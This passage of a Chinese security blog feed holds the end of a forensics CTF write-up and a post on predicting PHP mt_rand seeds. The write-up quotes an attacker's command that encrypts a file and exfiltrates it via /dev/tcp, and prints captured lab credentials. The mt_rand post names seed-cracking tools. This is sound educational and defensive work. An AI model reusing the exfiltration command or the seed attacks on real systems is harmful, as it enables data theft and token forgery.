<img src="https://s2.loli.net/2024/08/12/5Y37Kco9lVNSCMf.png" alt="Pasted image 20240812152056.png" loading="lazy"></p>
<h2 id="task-5">Task 5</h2>
<blockquote>
<p>How much time has passed from when the user was first created to when the attacker stopped using SSH?</p>
</blockquote>
<p>找到创建用户的数据包和最后一个 SSH 数据包，减一下即可。<br>
<img src="https://s2.loli.net/2024/08/12/3rvL4js9zwWQxKU.png" alt="Pasted image 20240812153025.png" loading="lazy"></p>
<h2 id="task-6">Task 6</h2>
<blockquote>
<p>What is the password for the account that the attacker used to backdoor?</p>
</blockquote>
<p>根据之前暴露的攻击脚本得知<br>
<img src="https://s2.loli.net/2024/08/12/RI8OQfS1Kcxai6q.png" alt="截屏2024-08-12 15.39.06.png" loading="lazy"></p>
<h2 id="task-7">Task 7</h2>
<blockquote>
<p>There is a secret in the exfiltrated file, what is its content?</p>
</blockquote>
<p>这个问题比较复杂，先搜集信息。从前面的分析我们知道攻击者通过添加用户进来，可以去家目录看看先。<br>
<img src="https://s2.loli.net/2024/08/12/dcPyzOsNUYpal5v.png" alt="截屏2024-08-12 16.22.48.png" loading="lazy"><br>
从 bash_history 中发现了攻击者加密了 Important.pdf，并通过 8080 端口发给自己了。</p>
<pre><code class="language-bash">sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 &lt;&lt;&lt; $(uname -r | md5sum)) -K $(cut -c 1-64 &lt;&lt;&lt; $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic &gt; /dev/tcp/192.168.222.130/8080
</code></pre>
<p>可惜密钥被隐藏了，我的思路是通过日志，可能可以找到完整的命令。<br>
<img src="https://s2.loli.net/2024/08/12/EvrGAMP6iFNYWOq.png" alt="截屏2024-08-12 16.26.19.png" loading="lazy"><br>
在数据包里找到 data.zip。</p>
<pre><code class="language-bash">ip.src==192.168.222.130 &amp;&amp; ip.dst==192.168.222.145&amp;&amp;tcp.port==8080
</code></pre>
<p>过滤规则定位到数据包，跟踪流后导出。<br>
<img src="https://s2.loli.net/2024/08/12/DZJixvLft1S8qYp.png" alt="Pasted image 20240812165313.png" loading="lazy"><br>
反过来解密即可</p>
<pre><code class="language-bash">dd if=enc_data.zip conv=ascii bs=1 | base64 -d | openssl enc -aes-256-cbc -d -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -out data.zip
</code></pre>
<h2 id="task-8">Task 8</h2>
<blockquote>
<p>What are the username and password that the attacker uses to access Splunk?</p>
</blockquote>
<p>找一下 Splunk 登陆包即可。</p>
<pre><code class="language-bash">POST /en-US/account/login HTTP/1.1
Host: ubuntu:8000
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Cookie: cval=1073532663; splunkweb_uid=AFB697A8-D703-4347-B58C-F751D8BD2E0F
Content-Length: 78
Content-Type: application/x-www-form-urlencoded

cval=1073532663&amp;username=johnnyC&amp;password=h3Re15j0hnNy&amp;set_has_logged_in=false
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[mt_rand 伪随机数攻击总结]]></title>
        <id>https://xor37.github.io/post/mt_rand-php-wei-sui-ji-shu-gong-ji-zong-jie/</id>
        <link href="https://xor37.github.io/post/mt_rand-php-wei-sui-ji-shu-gong-ji-zong-jie/">
        </link>
        <updated>2024-08-01T09:30:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>最近同事发现验证码接口在短时间内出现两个相同的验证码的神奇情况。<br>
从代码中得知验证码是通过 mt_rand() 生成的随机数，遂开始了解 mt_rand() 的安全性。</p>
<h2 id="伪随机数漏洞">伪随机数漏洞</h2>
<ul>
<li><code>mt_scrand()</code>   播种 Mersenne Twister 随机数生成器种子。</li>
<li><code>mt_rand()</code>     生成随机数。</li>
</ul>
<p>mt_rand() 每次被调用都会根据种子 seed 和当前调用的次数 i 来计算出一个伪随机数。<br>
当种子相同时，实际上生成的伪随机数是不变的，这就是伪随机数的漏洞所在。</p>
<h2 id="种子从哪来">种子从哪来？</h2>
<h3 id="php-7x-80-81">PHP 7.x 8.0-8.1</h3>
<p>PHP 在第一次使用随机数时进行 seeding，seeding 的熵仅有单一来源：系统当前的时间，单位微秒。<br>
地址：https://github.com/php/php-src/blob/PHP-7.4.25/ext/standard/mt_rand.c</p>
<pre><code class="language-c">PHPAPI void php_mt_srand(uint32_t seed)
{
  php_mt_initialize(seed, BG(state));
  php_mt_reload();
  BG(mt_rand_is_seeded) = 1;
}


PHPAPI uint32_t php_mt_rand(void)
{
  uint32_t s1;
  if (UNEXPECTED(!BG(mt_rand_is_seeded))) {
  	zend_long bytes;
	if (php_random_bytes_silent(&amp;bytes, sizeof(zend_long)) == FAILURE) {
		bytes = GENERATE_SEED();
	}
	php_mt_srand(bytes);
}
  if (BG(left) == 0) {
  	php_mt_reload();
  }
  --BG(left);
  s1 = *BG(next)++;
  s1 ^= (s1 &gt;&gt; 11);
  s1 ^= (s1 &lt;&lt;  7) &amp; 0x9d2c5680U;
  s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000U;
  return ( s1 ^ (s1 &gt;&gt; 18) );
}

</code></pre>
<h3 id="php-82-83">PHP 8.2-8.3</h3>
<p>首先尝试通过 php_random_bytes_silent 进行 seeding，若失败回退到时间，但不太可能失败。</p>
<h3 id="php-84未发布">PHP 8.4+（未发布）</h3>
<p>首先尝试通过 php_random_bytes_silent 进行 seeding，若失败回退到 php_random_generate_fallback_seed。<br>
php_random_generate_fallback_seed 的熵非常高，包含了时间，pid，ASLR地址等，几乎不可预测。</p>
<h2 id="攻击方式">攻击方式</h2>
<h3 id="计算种子">计算种子</h3>
<p>地址：https://www.ambionics.io/blog/php-mt-rand-prediction<br>
给定间隔 226 个值的两个 mt_rand() 输出结果，例如第 1 和 228 个 mt_rand() 的输出结果。<br>
这里的栗子是：种子为 12345678，获取第 124 个随机值和第 350 （124+226）个随机值。<br>
<img src="https://s2.loli.net/2024/08/04/MWxeqfcGzvVtaCy.png" alt="" loading="lazy"><br>
通过大佬的脚本即可还原种子。<br>
<img src="https://s2.loli.net/2024/08/04/8DywCIUkXV7fGbS.png" alt="" loading="lazy"></p>
<h3 id="爆破种子">爆破种子</h3>
<p>地址：https://github.com/openwall/php_mt_seed<br>
只需要知道第一个随机数即可爆破出种子，有更多连续的随机数的话结果会比较准确。（这里用两个随机数就爆出来了）<br>
<img src="https://s2.loli.net/2024/08/04/apN4IOX2fVrzHLv.png" alt="" loading="lazy"></p>
<h3 id="爆破种子-里应外合">爆破种子 - 里应外合</h3>
<p>地址：https://github.com/moorejacob2017/exploiting_phps_rand_function<br>
Jacob Moore 的研究，只需要知道 pid 与生成种子时系统的时间，即可爆出种子。比较适合做后门？</p>
<h4 id="种子的构成">种子的构成</h4>
<p>https://github.com/php/php-src/blob/PHP-8.1/ext/standard/php_rand.h<br>
<img src="https://s2.loli.net/2024/08/04/B7v5w26PSfUXVgR.png" alt="" loading="lazy"><br>
run_exploit.sh 会自动获取当前进程的 pid 和系统时间，即可爆破出种子。<br>
<img src="https://s2.loli.net/2024/08/04/K5ChELdyMIQrTge.png" alt="" loading="lazy"></p>
<h3 id="重复随机数风险">重复随机数风险</h3>
<p>在多进程的场景下，两个不同的请求进入同一个 pod 的两个不同的子进程，很有可能生成两个相同的种子，导致后面的随机数完全一致。例如使用 mt_rand 生成验证码的场景，你可能多次收到相同验证码。</p>
<h2 id="加固建议">加固建议</h2>
<p>使用 PHP 中的 random_int() 或 openssl_random_pseudo_bytes() ，这些函数是密码学安全随机数（CSPRNG），据有良好的不可预测性。</p>
]]></content>
    </entry>
</feed>